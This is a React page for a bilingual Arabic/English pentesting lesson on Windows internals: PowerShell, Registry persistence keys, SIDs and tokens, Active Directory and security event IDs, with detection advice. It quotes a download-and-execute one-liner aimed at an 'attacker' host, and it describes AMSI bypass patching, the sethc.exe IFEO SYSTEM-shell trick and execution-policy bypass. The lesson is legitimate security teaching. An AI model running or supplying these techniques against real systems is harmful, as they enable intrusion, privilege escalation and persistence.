"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="windows-fundamentals">
      <L
        ar={<>
          <Section title="ليه Windows مهم لو أنت Pentester؟">
            <p>تعالى نسأل من الأساس.</p>
            <p>إنت بتهاجم لينكس على HackTheBox من سنتين.. حلو.</p>
            <p>طب أول engagement هتدخله في الواقع، هتلاقي إيه؟</p>
            <p>هتلاقي 200 جهاز Windows.. كلهم مربوطين على Domain Controller.. والشغل الحقيقي مش على البورت 22، الشغل على 445 و389 و5985.</p>
            <p>أعرف واحد — صديق ليا — قعد يتعلم Red Team سنة كاملة على لينكس. لما اتحط في أول AD lab، بقى على ادهم. مش لإنه عيّل، لإنه ما فهمش <span className="eng">Token</span> ولا <span className="eng">SID</span> ولا الـ Registry. كل هجوم Privesc بيعدي عليه زي اللغز. قعد يـ copy-paste من المدونات من غير ما يفهم بيحصل إيه.</p>
            <p>Windows مش OS تاني. Windows عالم لوحده.</p>
            <p>75% من أجهزة المؤسسات في الدنيا كلها.. ومعظم الـ Active Directory في الكوكب. أي APT بتاكل عيش بتدخل Windows في مرحلة من المراحل. لو ما فهمتش Windows من جوّه، إنت بتلعب بإيد واحدة.</p>
            <Callout kind="info" title="اللي هنغطّيه">
              الـ Registry وأماكن الـ persistence الحقيقية، PowerShell كسلاح (وقصة AMSI)، نموذج SID/Token، وأهم Event IDs اللي لازم تعرفها بظهر قلب، ومقدمة AD.
            </Callout>
          </Section>

          <Section title="هيكل النظام">
            <Code lang="text">{`C:\\
├── Windows\\         ← نظام التشغيل
│   ├── System32\\    ← ملفات حيوية، DLLs، executables (cmd, powershell)
│   └── SysWOW64\\    ← 32-bit على نظام 64-bit
├── Program Files\\   ← برامج مثبتة (64-bit)
├── Program Files (x86)\\  ← برامج 32-bit
├── Users\\           ← مجلدات المستخدمين
│   └── alice\\
│       ├── AppData\\Local\\        ← بيانات تطبيق (Cache, history)
│       ├── AppData\\Roaming\\      ← تتنقّل مع المستخدم في AD
│       └── Documents\\
├── ProgramData\\     ← بيانات مشتركة (مرئي مخفياً)
└── Recycle Bin`}</Code>
          </Section>

          <Section title="PowerShell — السلاح الأهم.. وقصة AMSI">
            <p>PowerShell مش &quot;cmd بنكهة جديدة&quot;.</p>
            <p>دي لغة برمجة كاملة، بوصول مباشر لـ .NET، يعني عندك كل الـ Win32 API في إيدك. كل أداة pentest كبيرة على Windows اتكتبت بيها: Empire، PowerSploit، Nishang، PowerView. ولسة.</p>
            <p>طب تعالى أحكيلك القصة الحقيقية.</p>
            <p>قبل 2015، كان PowerShell جنة المهاجمين.</p>
            <p><span className="eng">IEX (New-Object Net.WebClient).DownloadString(&apos;http://attacker/payload.ps1&apos;)</span> — سطر واحد، الـ payload نزل في الذاكرة، اشتغل، وما لمسش الديسك. الـ AV ساعتها كان أعمى. خالص.</p>
            <p>كل Red Team operator عاش الفترة دي افتكر إنه عبقري. كان بيـ bypass كل حاجة بسطر بايثون.. آسف.. PowerShell.</p>
            <p>وبعدين جت Microsoft بـ <span className="eng">AMSI</span> (Antimalware Scan Interface) في Windows 10.</p>
            <p>الفكرة بسيطة وعبقرية: قبل ما PowerShell ينفّذ أي سكربت، بيبعت النص للـ AV scanner. ال AV بيقرا النص — مش الـ binary — ويقرر يسمح ولا لأ. حتى لو السكربت في الذاكرة بس، AMSI بيشوفه.</p>
            <p>الـ Red Teamers اتلطشوا. وفجأة كل أدواتهم القديمة بطّلت تشتغل.</p>
            <p>فبدأ سباق التسلّح:</p>
            <ul>
              <li><b>Obfuscation</b> — تكسير الكلمات اللي AMSI بيـ flag عليها (<span className="eng">Invoke-Mimikatz</span> بقت <span className="eng">In&apos;+&apos;voke-Mim&apos;+&apos;ikatz</span>).</li>
              <li><b>AMSI Bypass</b> — patching الدالة <span className="eng">AmsiScanBuffer</span> في الذاكرة عشان ترجع &quot;clean&quot; دايماً.</li>
              <li><b>Constrained Language Mode</b> — لو الـ Defender شدّاد، بيمنع .NET reflection أصلاً.</li>
            </ul>
            <p>الدرس هنا: PowerShell سلاح ذو حدّين. لو إنت Blue، فعّل <span className="eng">Script Block Logging</span> (Event 4104) و<span className="eng">Module Logging</span>. AMSI لوحده مش كفاية.</p>
            <p>الواقع vs المفروض: المفروض كل المؤسسات مفعّلاها. الواقع.. أغلب الجهات اللي شفتها بتكتفي بـ &quot;Windows Defender شغّال&quot; وخلاص.</p>
            <Terminal lines={[
              { p: "Get-ChildItem C:\\\\Users      # ls المعادل" },
              { p: "Get-Process                     # العمليات" },
              { p: "Get-Service                     # الخدمات" },
              { p: "Get-LocalUser                   # المستخدمون المحليون" },
              { p: "Get-NetTCPConnection            # المنافذ المفتوحة" },
              { p: "" },
              { p: "# تنفيذ أمر عن بُعد (يحتاج WinRM):" },
              { p: "Invoke-Command -ComputerName PC1 -ScriptBlock { whoami }" },
              { p: "" },
              { p: "# تنزيل ملف:" },
              { p: "Invoke-WebRequest http://10.10.10.5/file.zip -OutFile C:\\\\Temp\\\\f.zip" },
              { p: "" },
              { p: "# اكتشف policy تنفيذ السكربتات:" },
              { p: "Get-ExecutionPolicy" },
              { p: "# تجاوز للجلسة الحالية فقط:" },
              { p: "Set-ExecutionPolicy Bypass -Scope Process" },
            ]} />
          </Section>

          <Section title="Registry — قاعدة بيانات النظام كلها (وكنز الـ Persistence)">
            <p>الـ Registry هو المكان اللي ويندوز بيكتب فيه كل إعداد. كل setting في النظام. كل برنامج. كل user.</p>
            <p>اعتبره قاعدة بيانات الـ OS كاملة، مفتوحة قدامك، شغّالة في الذاكرة:</p>
            <Code lang="text">{`HKEY_LOCAL_MACHINE (HKLM)   ← إعدادات النظام كله
  └── SOFTWARE
  └── SYSTEM
  └── SECURITY (مقفل افتراضياً)
HKEY_CURRENT_USER (HKCU)    ← إعدادات المستخدم الحالي
HKEY_CLASSES_ROOT (HKCR)    ← ربط الملفات بالبرامج
HKEY_USERS (HKU)            ← كل المستخدمين`}</Code>
            <Terminal lines={[
              { p: "# قراءة قيمة:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select ProductName" },
              { p: "" },
              { p: "# مفاتيح مهمة في الأمن:" },
              { p: "# 1) Run keys — استمرار للبرامج:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'" },
              { p: "Get-ItemProperty 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'" },
              { p: "# 2) UAC settings:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System'" },
            ]} />
            <Callout kind="info" title="ليه الـ Run keys مهمة (والقصة الكاملة)">
              <p>تعالى نمشي على أهم 3 أماكن persistence في الـ Registry — اللي بيستخدمها أي malware من زمان لحد APT41:</p>
              <p><b>1) Run / RunOnce</b> — <span className="eng">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span>. أي قيمة هنا = برنامج يشتغل لما الـ user يـ login. عبيط؟ آه. لسة شغّال؟ آه.</p>
              <p><b>2) AppInit_DLLs</b> — <span className="eng">HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs</span>. أي DLL هنا بيتحقن في كل عملية بتـ load <span className="eng">user32.dll</span>. يعني تقريباً كل عملية GUI. مايكروسوفت قفلتها افتراضياً من Win8، بس لسة بتلاقيها مفتوحة في بيئات قديمة.</p>
              <p><b>3) Image File Execution Options (IFEO)</b> — تقدر تخلّي أي EXE يشغّل EXE تاني. الـ trick القديم: تحط <span className="eng">Debugger=cmd.exe</span> تحت <span className="eng">sethc.exe</span>، وبعدين تضغط Shift خمس مرات في شاشة الـ login = SYSTEM shell.</p>
              <p><b>اللي الـ Blue هيشوفه</b> — لو Sysmon مفعّل بـ config محترم (SwiftOnSecurity أو Olaf): Event ID 12/13/14 على أي تعديل في الـ Registry تحت المسارات دي. والـ Autoruns بيلملم الـ ~250 مكان persistence في شاشة واحدة. لو إنت DFIR ومش بتفتح Autoruns الأول، إنت بتعك.</p>
            </Callout>
          </Section>

          <Section title="نموذج الأمان — SID و Token (افهمها زي بطاقة المخابرات)">
            <p>تعالى أوريك الفكرة بتشبيه بسيط.</p>
            <p>تخيل المخابرات.</p>
            <p>كل ضابط عنده <b>بطاقة هوية</b> فيها رقمه القومي + الفرع التابع له + الرتبة + الصلاحيات اللي يقدر يدخل بيها أوضة من الأوض. البطاقة دي هي اللي بتحدد يقدر يدخل فين، لا الاسم ولا الوش.</p>
            <p>دي بالظبط الـ <b>Access Token</b> في Windows.</p>
            <ul>
              <li><b>SID (Security Identifier)</b> = الرقم القومي. شكله <span className="eng">S-1-5-21-...-1001</span>. ما بيتكررش، حتى لو حذفت اليوزر وعملت واحد بنفس الاسم — الـ SID الجديد هيبقى مختلف.</li>
              <li><b>Token</b> = البطاقة كلها. فيها SID اليوزر + SIDs بتاعة كل المجموعات اللي هو فيها + الـ Privileges (زي <span className="eng">SeDebugPrivilege</span>، <span className="eng">SeImpersonatePrivilege</span>).</li>
              <li><b>كل process</b> بيشتغل ومعاه token. الـ kernel بيقرر &quot;ينفع يفتح الملف ده ولا لأ&quot; بناءً على الـ token، مش بناءً على اسم اليوزر.</li>
            </ul>
            <p>ليه الكلام ده مهم لو إنت بتعمل privesc؟</p>
            <p>لإن نص هجمات الـ Privilege Escalation على Windows مبنية على فكرة واحدة: <b>سرقة أو تعديل التوكن</b>.</p>
            <ul>
              <li><b>Token Impersonation</b> — لو معاك <span className="eng">SeImpersonatePrivilege</span> (وأغلب service accounts معاهم)، تقدر تـ impersonate توكن أي عملية تانية. ده أساس <span className="eng">Potato</span> بكل أنواعه (Hot/Rotten/Juicy/Rogue).</li>
              <li><b>Pass-the-Token</b> — في AD، التوكن فيه TGT بتاع Kerberos. لو نسخته، إنت اليوزر ده.</li>
              <li><b>UAC Bypass</b> — UAC مش security boundary حقيقي، ده &quot;split token&quot; بس. في كذا 30+ bypass موثّقة في <span className="eng">UACME</span>.</li>
            </ul>
            <p>لو ما فهمتش الـ Token model، هتفضل تنفّذ هجمات وأنت مش فاهم بتحصل ليه. ولما الـ Defender يقفل الباب الواضح، مش هتلاقي الباب التاني.</p>

            <p>- طب ينفع أحفظ أوامر Mimikatz وخلاص؟؟</p>

            <p>كنت مستنيك تسأل ده يا مستجد. متوقّع. آه ينفع — لمدة أسبوع، لحد ما الـ EDR يقفل الـ command line ده. اللي بيعرف Token model بيلف على 5 طرق تانية. اللي حافظ commands بيقعد يدوّر على blog post جديد.</p>

            <p>اوعى تعتمد على أمر. اعتمد على الفهم.</p>
          </Section>

          <Section title="العمليات والخدمات">
            <Terminal lines={[
              { p: "tasklist                  # كل العمليات" },
              { p: "tasklist /svc             # العمليات + الخدمات داخلها" },
              { p: "taskkill /F /PID 1234     # اقتل عملية" },
              { p: "" },
              { p: "# الخدمات:" },
              { p: "sc query                  # كل الخدمات" },
              { p: "sc qc spooler             # تفاصيل خدمة" },
              { p: "Get-Service spooler       # PowerShell" },
              { p: "Stop-Service spooler      # أوقف" },
              { p: "" },
              { p: "# ابحث عن عمليات بأسماء غير معروفة:" },
              { p: "Get-Process | Where-Object { $_.Path -notlike 'C:\\\\Windows\\\\*' -and $_.Path -notlike 'C:\\\\Program Files*' }" },
            ]} />
          </Section>

          <Section title="حسابات ومستخدمون">
            <Terminal lines={[
              { p: "whoami                    # من أنا" },
              { p: "whoami /priv              # صلاحياتي" },
              { p: "whoami /groups            # مجموعاتي" },
              { p: "net user                  # كل المستخدمين المحليين" },
              { p: "net user alice            # تفاصيل مستخدم" },
              { p: "net localgroup Administrators    # أعضاء Administrators" },
              { p: "" },
              { p: "# هل أنا في AD؟" },
              { p: "echo %USERDOMAIN%         # اسم النطاق (أو اسم الجهاز إذا غير منضم)" },
              { p: "nltest /domain_trusts     # نطاقات موثوقة" },
            ]} />
          </Section>

          <Section title="الشبكة على Windows">
            <Terminal lines={[
              { p: "ipconfig /all              # كل الإعدادات" },
              { p: "netstat -ano               # المنافذ + PID المالك" },
              { p: "arp -a                     # ARP cache" },
              { p: "route print                # جدول التوجيه" },
              { p: "" },
              { p: "# DNS:" },
              { p: "nslookup example.com" },
              { p: "Resolve-DnsName example.com    # PowerShell" },
              { p: "" },
              { p: "# اتصالات SMB:" },
              { p: "net use                    # مشاركات أنا متصل بها" },
              { p: "net view \\\\\\\\10.10.10.5    # مشاركات على جهاز بعيد" },
            ]} />
          </Section>

          <Section title="مقدمة في Active Directory">
            <p>AD = خدمة directory مركزية تدير المستخدمين، الحواسيب، الصلاحيات في شبكة المؤسسة. مفاهيم رئيسية:</p>
            <ul>
              <li><b>Domain</b> — مجموعة من الموارد تتشارك قاعدة بيانات (مثل <span className="eng">corp.local</span>).</li>
              <li><b>Domain Controller (DC)</b> — الخادم الذي يحمل قاعدة البيانات.</li>
              <li><b>OU (Organizational Unit)</b> — مجلد منطقي لتنظيم.</li>
              <li><b>GPO (Group Policy Object)</b> — سياسات تُطبق آلياً.</li>
              <li><b>Kerberos</b> — بروتوكول المصادقة الافتراضي.</li>
              <li><b>NTLM</b> — البروتوكول القديم، ما زال يُستخدم. مصدر كثير من الهجمات.</li>
            </ul>
            <Terminal lines={[
              { p: "# على جهاز منضم لـ AD:" },
              { p: "Get-ADUser -Identity alice              # تفاصيل مستخدم (يحتاج RSAT)" },
              { p: "Get-ADComputer -Filter *                # كل الحواسيب" },
              { p: "Get-ADGroup 'Domain Admins' -Properties Members" },
              { p: "" },
              { p: "# بدون RSAT — فقط أوامر الـ net:" },
              { p: "net user /domain alice" },
              { p: "net group 'Domain Admins' /domain" },
            ]} />
          </Section>

          <Section title="Event Logs — الأرقام اللي لازم تحفظها بظهر قلب">
            <p>تعالى أحكيلك حكاية حصلت فعلاً.</p>
            <p>محلل في SOC في جهة كبيرة — مش هقول مكان — كان عامل dashboard ظريف بيراقب فيه Event 4624 (تسجيل دخول ناجح). كل يوم بيبص على القايمة، يشوف &quot;كله تمام&quot;، ويقفل.</p>
            <p>المهاجم دخل من حساب service account.. عمل psexec على 12 جهاز.. سرق hash الـ KRBTGT.. وعمل Golden Ticket.</p>
            <p>الـ 4624 كانت كلها &quot;ناجحة&quot;. طبعاً ناجحة، هو ماشي بتذكرة Kerberos صحيحة. الدنيا كلها &quot;ناجحة&quot;.</p>
            <p>اللي فاته: <b>4688</b> — process creation. كان هيشوف <span className="eng">cmd.exe</span> بتنشأ من <span className="eng">services.exe</span> على 12 جهاز خلال 4 دقايق. ده مش طبيعي.</p>
            <p>الدرس: لو بتراقب 4624 لوحده، إنت مش بتراقب. إنت بتعد. خليني أديك القائمة اللي لازم تتبصمل عليها:</p>
            <Code lang="text">{`Security log:
  4624  ← تسجيل دخول ناجح
  4625  ← تسجيل دخول فاشل
  4672  ← تسجيل دخول بصلاحيات خاصة
  4688  ← عملية جديدة بدأت
  4720  ← مستخدم جديد أُنشئ
  4732  ← عضو جديد أُضيف لمجموعة محلية
  4768/4769  ← Kerberos TGT/TGS

System log:
  7045  ← خدمة جديدة ثُبّتت (مهم — كثير من الـ malware)
  7036  ← خدمة بدأت/توقفت

PowerShell logs (إذا فُعّلت):
  4103/4104  ← تنفيذ سكربت / module logging`}</Code>
            <Terminal lines={[
              { p: "# اقرأ آخر 10 محاولات دخول فاشلة:" },
              { p: "Get-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4625]]\" -MaxEvents 10" },
              { p: "" },
              { p: "# آخر الخدمات الجديدة:" },
              { p: "Get-WinEvent -LogName System -FilterXPath \"*[System[EventID=7045]]\" -MaxEvents 5" },
            ]} />
          </Section>

          <Section title="أدوات Sysinternals — يجب أن تعرفها">
            <TwoCol>
              <Card title="Process Explorer" color="amber">بديل Task Manager بآلاف المرات. يُظهر شجرة العمليات، الـ DLLs، التواقيع.</Card>
              <Card title="Autoruns" color="amber">يستعرض كل مكان استمرار محتمل (~250 موقع). أهم أداة للـ DFIR.</Card>
              <Card title="Sysmon" color="blue">يسجل أحداث تفصيلية (process create، DNS، ملفات). أساس detection الناضج.</Card>
              <Card title="Procmon" color="amber">يلتقط كل I/O — أفضل أداة لمعرفة &quot;ما يفعله البرنامج فعلاً&quot;.</Card>
              <Card title="PsExec" color="red">تنفيذ أوامر عن بُعد — أداة شرعية يساء استخدامها كثيراً.</Card>
              <Card title="TCPView" color="amber">netstat بواجهة حية.</Card>
            </TwoCol>
          </Section>

          <Section title="ممارسة">
            <ol>
              <li>افتح PowerShell على Windows VM، نفّذ كل أمر فوق.</li>
              <li>حمّل Sysinternals Suite، شغّل Autoruns، وشوف كم مكان النظام بيبدأ منه فعلاً.</li>
              <li>في Event Viewer، دوّر على آخر 4624 — هتلاقي نفسك.</li>
              <li>اقرأ <span className="eng">Get-Help</span> — مكافئ <span className="eng">man</span>: <span className="eng">Get-Help Get-Process -Examples</span>.</li>
              <li>افتح <span className="eng">whoami /all</span>، وحاول تطابق كل SID مع المجموعة بتاعته. ده هيبقى مرجعك.</li>
            </ol>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>Windows مش أصعب من لينكس.</p>
            <p>هو بس مختلف.</p>
            <p>لو فهمت الـ SID، والـ Token، والـ Registry — هتفهم كل هجوم تاني.</p>
            <p>كل Privesc, كل persistence, كل lateral movement, كل AD attack بتيجي بعدين — كلها مبنية على نفس الأساس ده.</p>
            <p>اللي بيحفظ أوامر من غير ما يفهم النموذج، بيقف عند أول جهاز ما يـ pop عليه shell. واللي فاهم النموذج، بيدخل على الجهاز ويعرف فوراً يدوّر فين.</p>
            <p>اكتبها على كشكول الـ lab: SID + Token + Registry = نص Windows. الباقي تفاصيل.</p>
            <p>كن من التانيين.</p>
          </Section>
        </>}
        en={<>
          <Section title="Why Windows for security professionals">
            <p>Windows runs ~75% of enterprise endpoints and most of the world&apos;s Active Directory. Nearly every APT touches Windows at some stage. Internal Windows fluency = half the red/blue team battle.</p>
            <Callout kind="info" title="Goal">
              Understand: Registry, PowerShell as a power tool, services and processes, log events, and a first idea of Active Directory.
            </Callout>
          </Section>

          <Section title="System layout">
            <Code lang="text">{`C:\\
├── Windows\\         ← OS
│   ├── System32\\    ← critical files, DLLs, executables (cmd, powershell)
│   └── SysWOW64\\    ← 32-bit on 64-bit OS
├── Program Files\\   ← 64-bit installed apps
├── Program Files (x86)\\  ← 32-bit apps
├── Users\\           ← user homes
│   └── alice\\
│       ├── AppData\\Local\\        ← app data (cache, history)
│       ├── AppData\\Roaming\\      ← roams with the user in AD
│       └── Documents\\
├── ProgramData\\     ← shared (hidden by default)
└── Recycle Bin`}</Code>
          </Section>

          <Section title="PowerShell — the most powerful tool on Windows">
            <p>PowerShell isn&apos;t &quot;newer cmd&quot;. It&apos;s a full programming language with .NET access. Almost every Windows pentest tool is built on it.</p>
            <Terminal lines={[
              { p: "Get-ChildItem C:\\\\Users      # ls equivalent" },
              { p: "Get-Process                     # processes" },
              { p: "Get-Service                     # services" },
              { p: "Get-LocalUser                   # local users" },
              { p: "Get-NetTCPConnection            # open ports" },
              { p: "" },
              { p: "# remote command (needs WinRM):" },
              { p: "Invoke-Command -ComputerName PC1 -ScriptBlock { whoami }" },
              { p: "" },
              { p: "# download a file:" },
              { p: "Invoke-WebRequest http://10.10.10.5/file.zip -OutFile C:\\\\Temp\\\\f.zip" },
              { p: "" },
              { p: "# check execution policy:" },
              { p: "Get-ExecutionPolicy" },
              { p: "# bypass for the current session only:" },
              { p: "Set-ExecutionPolicy Bypass -Scope Process" },
            ]} />
          </Section>

          <Section title="Registry — the configuration database">
            <p>The Registry is where Windows stores every setting. The map:</p>
            <Code lang="text">{`HKEY_LOCAL_MACHINE (HKLM)   ← system-wide settings
  └── SOFTWARE
  └── SYSTEM
  └── SECURITY (locked by default)
HKEY_CURRENT_USER (HKCU)    ← current user
HKEY_CLASSES_ROOT (HKCR)    ← file→app associations
HKEY_USERS (HKU)            ← all users`}</Code>
            <Terminal lines={[
              { p: "# read a value:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select ProductName" },
              { p: "" },
              { p: "# security-relevant keys:" },
              { p: "# 1) Run keys — autostart for programs:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'" },
              { p: "Get-ItemProperty 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'" },
              { p: "# 2) UAC:" },
              { p: "Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System'" },
            ]} />
            <Callout kind="info" title="Why Run keys matter">
              The most common place malware writes itself for boot persistence. <span className="eng">Sysinternals Autoruns</span> is the gold-standard tool to enumerate every persistence location at once.
            </Callout>
          </Section>

          <Section title="Processes and services">
            <Terminal lines={[
              { p: "tasklist                  # all processes" },
              { p: "tasklist /svc             # processes + services running inside them" },
              { p: "taskkill /F /PID 1234     # kill" },
              { p: "" },
              { p: "# services:" },
              { p: "sc query                  # all services" },
              { p: "sc qc spooler             # service details" },
              { p: "Get-Service spooler       # PowerShell" },
              { p: "Stop-Service spooler" },
              { p: "" },
              { p: "# look for processes outside known dirs:" },
              { p: "Get-Process | Where-Object { $_.Path -notlike 'C:\\\\Windows\\\\*' -and $_.Path -notlike 'C:\\\\Program Files*' }" },
            ]} />
          </Section>

          <Section title="Accounts and users">
            <Terminal lines={[
              { p: "whoami                    # who am I" },
              { p: "whoami /priv              # my privileges" },
              { p: "whoami /groups            # my groups" },
              { p: "net user                  # all local users" },
              { p: "net user alice            # user details" },
              { p: "net localgroup Administrators    # local admins" },
              { p: "" },
              { p: "# am I in AD?" },
              { p: "echo %USERDOMAIN%         # domain or hostname if not joined" },
              { p: "nltest /domain_trusts     # trusted domains" },
            ]} />
          </Section>

          <Section title="Networking on Windows">
            <Terminal lines={[
              { p: "ipconfig /all              # every adapter" },
              { p: "netstat -ano               # ports + owning PID" },
              { p: "arp -a                     # ARP cache" },
              { p: "route print                # routing table" },
              { p: "" },
              { p: "# DNS:" },
              { p: "nslookup example.com" },
              { p: "Resolve-DnsName example.com    # PowerShell" },
              { p: "" },
              { p: "# SMB:" },
              { p: "net use                    # shares I'm mounted to" },
              { p: "net view \\\\\\\\10.10.10.5    # shares on a remote host" },
            ]} />
          </Section>

          <Section title="Intro to Active Directory">
            <p>AD = central directory service that manages users, computers, and permissions across a corporate network. Core terms:</p>
            <ul>
              <li><b>Domain</b> — a set of resources sharing a database (e.g. <span className="eng">corp.local</span>).</li>
              <li><b>Domain Controller (DC)</b> — the server holding the database.</li>
              <li><b>OU (Organizational Unit)</b> — a logical folder for organization.</li>
              <li><b>GPO (Group Policy Object)</b> — policies applied automatically.</li>
              <li><b>Kerberos</b> — the default auth protocol.</li>
              <li><b>NTLM</b> — the legacy protocol, still active. Source of many attacks.</li>
            </ul>
            <Terminal lines={[
              { p: "# on a domain-joined host:" },
              { p: "Get-ADUser -Identity alice              # user details (needs RSAT)" },
              { p: "Get-ADComputer -Filter *                # all hosts" },
              { p: "Get-ADGroup 'Domain Admins' -Properties Members" },
              { p: "" },
              { p: "# without RSAT — just net:" },
              { p: "net user /domain alice" },
              { p: "net group 'Domain Admins' /domain" },
            ]} />
          </Section>

          <Section title="Event logs">
            <p>Windows records everything in Event Viewer. Each event has an ID — memorizing a few separates the casual attacker from a serious defender:</p>
            <Code lang="text">{`Security log:
  4624  ← successful logon
  4625  ← failed logon
  4672  ← logon with special privileges
  4688  ← new process started
  4720  ← new user created
  4732  ← member added to local group
  4768/4769  ← Kerberos TGT/TGS

System log:
  7045  ← new service installed (key — many malware artifacts)
  7036  ← service started/stopped

PowerShell logs (if enabled):
  4103/4104  ← script block / module logging`}</Code>
            <Terminal lines={[
              { p: "# last 10 failed logons:" },
              { p: "Get-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4625]]\" -MaxEvents 10" },
              { p: "" },
              { p: "# recent new services:" },
              { p: "Get-WinEvent -LogName System -FilterXPath \"*[System[EventID=7045]]\" -MaxEvents 5" },
            ]} />
          </Section>

          <Section title="Sysinternals tools — required reading">
            <TwoCol>
              <Card title="Process Explorer" color="amber">Task Manager x1000. Shows process tree, loaded DLLs, signatures.</Card>
              <Card title="Autoruns" color="amber">Enumerates ~250 persistence locations. Most important DFIR tool.</Card>
              <Card title="Sysmon" color="blue">Logs detailed events (process create, DNS, file). Foundation of mature detection.</Card>
              <Card title="Procmon" color="amber">Captures every I/O — best tool to learn &quot;what is this program actually doing&quot;.</Card>
              <Card title="PsExec" color="red">Remote command execution — legitimate tool, heavily abused.</Card>
              <Card title="TCPView" color="amber">A live netstat with a UI.</Card>
            </TwoCol>
          </Section>

          <Section title="Practice">
            <ol>
              <li>Open PowerShell on a Windows VM, run every command above.</li>
              <li>Install Sysinternals Suite, launch Autoruns, see how many places autostart.</li>
              <li>In Event Viewer, find the latest 4624 — that&apos;s you logging in.</li>
              <li>Skim <span className="eng">Get-Help</span> — the <span className="eng">man</span> equivalent: <span className="eng">Get-Help Get-Process -Examples</span>.</li>
            </ol>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
